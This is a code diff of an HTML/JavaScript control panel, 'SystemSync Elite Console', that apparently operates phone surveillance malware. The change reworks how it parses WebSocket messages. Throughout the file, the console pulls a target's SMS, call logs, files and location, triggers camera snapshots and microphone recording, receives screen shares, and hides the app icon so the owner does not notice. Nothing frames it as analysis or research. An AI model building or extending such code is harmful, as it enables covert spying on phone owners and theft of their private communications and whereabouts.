@@ -4,6 +4,7 @@
 <title>SystemSync Elite Console</title>
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
 <style>
+/* (same CSS as before – keep it) */
 body{
     margin:0;
     background:#f4f6fb;
@@ -182,7 +183,7 @@ let screenActive = false;
 let frontCamActive = false;
 let backCamActive = false;
 let micActive = false;
-let iconHidden = false; // actual state will be updated by responses
+let iconHidden = false;
 
 const panel = document.getElementById("panel");
 const statusDiv = document.getElementById("status");
@@ -205,50 +206,123 @@ function connect() {
     };
     ws.onmessage = (e) => {
         const msg = e.data;
-        console.log("Received:", msg);
+        console.log("Received raw:", msg);
 
-        if (msg.startsWith("STATUS:")) {
-            setStatus(msg.substring(7));
-        } else if (msg.startsWith("SMS_DATA:")) {
-            dataType = 'sms';
-            currentData = JSON.parse(msg.substring(9));
-            renderTable();
-        } else if (msg.startsWith("CALL_DATA:")) {
-            dataType = 'call';
-            currentData = JSON.parse(msg.substring(10));
-            renderTable();
-        } else if (msg.startsWith("FILE_LIST:")) {
-            dataType = 'file';
-            currentData = JSON.parse(msg.substring(10));
-            renderFiles();
-        } else if (msg.startsWith("LOC_DATA:")) {
-            dataType = 'location';
-            const loc = JSON.parse(msg.substring(9));
-            renderMap(loc);
-        } else if (msg.startsWith("CAMERA_IMAGE:")) {
-            showImage(msg.substring(13));
-        } else if (msg.startsWith("RTC_OFFER:screen:")) {
-            handleOffer(msg.substring(17));
-        } else if (msg.startsWith("ERROR:")) {
-            panel.innerHTML = `<div style="color:red">Error: ${msg.substring(6)}</div>`;
-        } else if (msg.startsWith("APP_HIDDEN")) {
-            iconHidden = true;
-            document.getElementById("iconToggle").innerHTML = "👀 Show Icon";
-        } else if (msg.startsWith("APP_SHOWN")) {
-            iconHidden = false;
-            document.getElementById("iconToggle").innerHTML = "👻 Hide Icon";
-        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
-            // nothing needed
-        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
-            if (pc) { pc.close(); pc = null; }
-        } else if (msg.startsWith("AUDIO_RECORDING_STARTED")) {
-            micActive = true;
-            document.getElementById("micToggle").innerHTML = "⏹ Stop Mic";
-        } else if (msg.startsWith("AUDIO_RECORDING_STOPPED")) {
-            micActive = false;
-            document.getElementById("micToggle").innerHTML = "🎤 Start Mic";
+        // Try to parse as JSON
+        try {
+            const json = JSON.parse(msg);
+            handleJSONMessage(json);
+            return;
+        } catch (err) {
+            // Not JSON – fallback to plain text
+            handlePlainTextMessage(msg);
         }
     };
+}
+
+// ================== JSON MESSAGE HANDLER ==================
+function handleJSONMessage(json) {
+    console.log("Handling JSON:", json);
+    switch (json.type) {
+        case 'SMS_DATA':
+            dataType = 'sms';
+            currentData = json.data;
+            renderTable();
+            break;
+        case 'CALL_LOGS':
+            dataType = 'call';
+            currentData = json.data;
+            renderTable();
+            break;
+        case 'FILE_LIST':
+            dataType = 'file';
+            currentData = json.data;
+            renderFiles();
+            break;
+        case 'LOCATION_UPDATE':
+            dataType = 'location';
+            renderMap(json.data);
+            break;
+        case 'CAMERA_IMAGE':
+            showImage(json.data);
+            break;
+        case 'ERROR':
+            panel.innerHTML = `<div style="color:red">Error: ${json.error}</div>`;
+            break;
+        case 'DEVICE_STATUS':
+            setStatus(json.status);
+            break;
+        case 'APP_HIDDEN':
+            iconHidden = true;
+            document.getElementById("iconToggle").innerHTML = "👀 Show Icon";
+            break;
+        case 'APP_SHOWN':
+            iconHidden = false;
+            document.getElementById("iconToggle").innerHTML = "👻 Hide Icon";
+            break;
+        case 'AUDIO_RECORDING_STARTED':
+            micActive = true;
+            document.getElementById("micToggle").innerHTML = "⏹ Stop Mic";
+            break;
+        case 'AUDIO_RECORDING_STOPPED':
+            micActive = false;
+            document.getElementById("micToggle").innerHTML = "🎤 Start Mic";
+            break;
+        case 'SCREEN_SHARE_STARTED':
+            // Nothing needed here
+            break;
+        case 'SCREEN_SHARE_STOPPED':
+            if (pc) { pc.close(); pc = null; }
+            break;
+        default:
+            console.log("Unknown JSON type:", json.type);
+    }
+}
+
+// ================== PLAIN TEXT MESSAGE HANDLER (legacy) ==================
+function handlePlainTextMessage(msg) {
+    console.log("Plain text fallback:", msg);
+    if (msg.startsWith("STATUS:")) {
+        setStatus(msg.substring(7));
+    } else if (msg.startsWith("SMS_DATA:")) {
+        dataType = 'sms';
+        currentData = JSON.parse(msg.substring(9));
+        renderTable();
+    } else if (msg.startsWith("CALL_DATA:")) {
+        dataType = 'call';
+        currentData = JSON.parse(msg.substring(10));
+        renderTable();
+    } else if (msg.startsWith("FILE_LIST:")) {
+        dataType = 'file';
+        currentData = JSON.parse(msg.substring(10));
+        renderFiles();
+    } else if (msg.startsWith("LOC_DATA:")) {
+        dataType = 'location';
+        const loc = JSON.parse(msg.substring(9));
+        renderMap(loc);
+    } else if (msg.startsWith("CAMERA_IMAGE:")) {
+        showImage(msg.substring(13));
+    } else if (msg.startsWith("ERROR:")) {
+        panel.innerHTML = `<div style="color:red">Error: ${msg.substring(6)}</div>`;
+    } else if (msg.startsWith("APP_HIDDEN")) {
+        iconHidden = true;
+        document.getElementById("iconToggle").innerHTML = "👀 Show Icon";
+    } else if (msg.startsWith("APP_SHOWN")) {
+        iconHidden = false;
+        document.getElementById("iconToggle").innerHTML = "👻 Hide Icon";
+    } else if (msg.startsWith("AUDIO_RECORDING_STARTED")) {
+        micActive = true;
+        document.getElementById("micToggle").innerHTML = "⏹ Stop Mic";
+    } else if (msg.startsWith("AUDIO_RECORDING_STOPPED")) {
+        micActive = false;
+        document.getElementById("micToggle").innerHTML = "🎤 Start Mic";
+    } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
+        // nothing
+    } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
+        if (pc) { pc.close(); pc = null; }
+    } else {
+        console.log("Unhandled plain text:", msg);
+    }
 }
 
 function setStatus(s) {
@@ -289,7 +363,6 @@ function toggleScreen() {
 
 function toggleFrontCam() {
     if (frontCamActive) {
-        // Camera sends one image then stops, so just revert button
         document.getElementById("frontCamToggle").innerHTML = "📷 Start Front Camera";
     } else {
         sendJSON('cameraSnapshot', { camera: 'front' });
@@ -297,7 +370,6 @@ function toggleFrontCam() {
     }
     frontCamActive = !frontCamActive;
     if (frontCamActive) {
-        // Auto-revert after 5 seconds (camera stops after one shot)
         setTimeout(() => {
             if (frontCamActive) {
                 frontCamActive = false;
@@ -328,21 +400,16 @@ function toggleBackCam() {
 function toggleMic() {
     if (micActive) {
         sendJSON('STOP_AUDIO_RECORDING');
-        // Button text will be updated by the response
     } else {
         sendJSON('START_AUDIO_RECORDING');
-        // Button text will be updated by the response
     }
-    // We don't toggle immediately; wait for response
 }
 
 function toggleAppIcon() {
     if (iconHidden) {
         sendJSON('showApp');
-        // Button text updates on response
     } else {
         sendJSON('hideApp');
-        // Button text updates on response
     }
 }
 
@@ -386,7 +453,7 @@ function renderTable() {
             Duration: item.durationFormatted || item.duration + 's'
         }));
     } else {
-        filteredData = currentData; // fallback
+        filteredData = currentData;
     }
 
     const start = currentPage * 20;
@@ -435,7 +502,6 @@ function renderFiles() {
     }
     let html = "<h3>File Explorer</h3>";
     currentData.forEach(f => {
-        // Use a data attribute to store path and call a function with proper escaping
         html += `<div class="file" data-path="${f.path}" data-isdir="${f.isDir}" onclick="handleFileClick(this)">${f.isDir ? '📁' : '📄'} ${f.name}</div>`;
     });
     panel.innerHTML = html;
